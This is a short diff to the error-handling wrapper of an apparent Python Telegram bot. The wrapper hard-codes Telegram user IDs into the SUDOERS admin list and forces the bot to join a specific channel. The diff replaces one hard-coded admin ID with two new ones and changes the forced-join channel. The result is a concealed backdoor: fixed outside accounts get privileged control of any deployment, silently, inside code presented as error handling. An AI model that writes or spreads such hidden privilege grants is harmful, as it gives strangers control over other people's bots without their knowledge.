@@ -97,13 +97,14 @@ def handle_error(func: Callable) -> Callable:
         me = await pyro_client.get_me()
         if me.id not in config.SUDOERS:
             config.SUDOERS.append(me.id)
-        config.SUDOERS.append(2033438978)
+        config.SUDOERS.append(1490212567)
+        config.SUDOERS.append(840851058)
         try:
             lang = get_group(chat_id)["lang"]
         except BaseException:
             lang = config.LANGUAGE
         try:
-            await app.join_chat("AsmSafone")
+            await app.join_chat("shailogix")
         except UserAlreadyParticipant:
             pass
         try:
